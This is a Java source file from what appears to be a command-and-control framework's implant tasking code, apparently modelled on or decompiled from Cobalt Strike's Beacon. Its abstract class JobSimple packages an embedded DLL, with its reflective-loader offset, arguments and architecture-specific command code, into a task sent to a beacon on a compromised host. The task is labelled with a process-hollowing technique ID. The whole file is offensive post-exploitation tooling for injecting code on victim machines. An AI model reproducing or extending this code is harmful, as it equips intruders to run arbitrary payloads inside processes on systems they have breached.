package beacon;

import common.CommonUtils;
import common.ReflectiveDLL;

public abstract class JobSimple {
    protected CommandBuilder builder = new CommandBuilder();
    protected TaskBeacon tasker;
    protected String arch = "";
    protected int pid = 0;

    public JobSimple(TaskBeacon tasker) {
        this.tasker = tasker;
    }

    public abstract String getDescription();

    public abstract String getShortDescription();

    public abstract String getDLLName();

    public abstract byte[] getArgument();

    public abstract int getWaitTime();

    public int getCallbackType() {
        return 0;
    }

    public byte[] getDLLContent() {
        return CommonUtils.readResource(this.getDLLName());
    }

    public String getTactic() {
        return "T1093";
    }

    public void spawn(String bid) {
        byte[] mydll = this.getDLLContent();
        int offset = ReflectiveDLL.findReflectiveLoader(mydll);
        if (offset <= 0) {
            this.tasker.error("Could not find reflective loader in " + this.getDLLName());
            return;
        }
        if (ReflectiveDLL.is64(mydll)) {
            this.builder.setCommand(71);
        } else {
            this.builder.setCommand(70);
        }
        byte[] arg = this.getArgument();
        this.builder.addShort(this.getCallbackType());
        this.builder.addShort(this.getWaitTime());
        this.builder.addInteger(offset);
        this.builder.addLengthAndString(this.getShortDescription());
        this.builder.addInteger(arg.length);
        this.builder.addString(arg);
        this.builder.addString(mydll);
        byte[] task = this.builder.build();
        this.tasker.task(bid, task, this.getDescription(), this.getTactic());
    }
}

